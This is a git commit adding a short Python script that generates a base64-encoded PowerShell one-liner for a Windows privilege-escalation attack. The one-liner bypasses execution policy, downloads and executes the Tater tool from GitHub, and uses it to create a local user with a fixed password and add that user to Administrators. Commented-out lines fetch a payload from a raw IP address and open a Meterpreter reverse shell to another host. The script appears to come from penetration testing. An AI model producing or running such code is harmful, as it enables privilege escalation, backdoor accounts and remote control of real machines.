d4910f9ca9f5a254185d89621e535318e3238102
Jon <github@alleskaputt.com>
2016-09-01 09:55:25 +0200

    added some shit

---
+++ generate_powershell_tater.py
@@ -0,0 +1,23 @@
+import base64
+
+command = "cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc "
+
+
+powershell_command = "$browser = New-Object System.Net.WebClient; $browser.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials;"
+#powershell_command += 'iex $browser.DownloadString("http://92.60.14.160:8000/payload"); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 212.47.254.99 -Lport 4444 -Force'
+#powershell_command += 'IEX $browser.DownloadString("http://92.60.14.160:8000/payload"); Invoke-Shellcode'
+
+powershell_command += "IEX $browser.DownloadString('https://raw.githubusercontent.com/jbarg/Tater/master/Tater.ps1'); Invoke-Tater -Trigger 1 -Command \"net user secconsult Test123! /add\""
+powershell_command += "IEX $browser.DownloadString('https://raw.githubusercontent.com/jbarg/Tater/master/Tater.ps1'); Invoke-Tater -Trigger 1 -Command \"net localgroup administrators secconsult /add\""
+
+blank_command = ""
+for char in powershell_command:
+    blank_command += char + "\x00"
+
+powershell_command = blank_command
+powershell_command = base64.b64encode(powershell_command)
+command += powershell_command
+print command
+
+
+
